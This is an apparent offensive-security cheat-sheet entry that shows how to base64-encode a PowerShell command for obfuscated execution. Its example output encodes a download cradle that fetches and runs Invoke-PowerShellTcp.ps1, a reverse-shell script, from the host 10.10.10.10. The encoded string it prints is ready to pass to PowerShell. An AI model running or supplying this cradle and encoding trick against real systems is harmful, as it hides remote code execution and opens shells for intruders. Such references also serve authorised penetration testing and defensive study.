---
id: 9313e70d-e9d4-40a1-b2b1-a9efef14db94
name: PowerShell Base64 Encode a String
type: command
executor: powershell
data: '$Text = "$_PAYLOAD"

  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

  $EncodedText=[Convert]::ToBase64String($Bytes)

  $EncodedText'
output: '$Text = "iex (New-Object Net.WebClient).downloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1'')"

  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

  $EncodedText=[Convert]::ToBase64String($Bytes)

  $EncodedText


  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA=='
created_at: '2019-11-13T23:17:32.929399+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Powershell]]'
---

# PowerShell Base64 Encode a String

```powershell
$Text = "$_PAYLOAD"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText
```

## Expected Output

```
$Text = "iex (New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText

aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==
```


